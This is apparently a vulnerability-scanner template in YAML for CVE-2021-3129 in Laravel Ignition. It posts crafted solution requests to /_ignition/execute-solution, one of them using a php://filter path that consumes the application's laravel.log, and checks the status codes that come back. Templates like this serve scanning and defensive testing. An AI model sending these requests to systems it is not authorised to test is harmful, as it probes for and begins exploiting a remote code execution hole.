id: yaml-poc-laravel-laravel-unauthorized_access-CVE-2021-3129
info:
  name: Yaml Poc Laravel Laravel Unauthorized_Access Cve 2021 3129
  author: luhan.xu
  severity: critical
  description: 'Converted from xpoc: yaml-poc-laravel-laravel-unauthorized_access-CVE-2021-3129'
  tags: laravel,unauth,cve
  classification:
    cve-id: CVE-2021-3129
  reference:
  - http://packetstormsecurity.com/files/162094/Ignition-2.5.1-Remote-Code-Execution.html
  - http://packetstormsecurity.com/files/165999/Ignition-Remote-Code-Execution.html
  - https://cxsecurity.com/issue/WLB-2021040061
  - https://github.com/facade/ignition/pull/334
  - https://nvd.nist.gov/vuln/detail/CVE-2021-3129
http:
- method: POST
  path:
  - /_ignition/execute-solution
  body: '{"solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
    "parameters": {"variableName": "{{variableName}}", "viewFile": "xxxx xx"}}

    '
  headers:
    Accept: application/json
    Content-Type: application/json
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 500
- method: POST
  path:
  - /_ignition/execute-solution
  body: '{"solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
    "parameters": {"variableName": "{{variableName}}", "viewFile": "php://filter/read=consumed/resource=../storage/logs/laravel.log"}}

    '
  headers:
    Accept: application/json
    Content-Type: application/json
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
- method: POST
  path:
  - /_ignition/execute-solution
  body: '{"solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
    "parameters": {"variableName": "{{variableName}}", "viewFile": "AA"}}

    '
  headers:
    Accept: application/json
    Content-Type: application/json
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 500
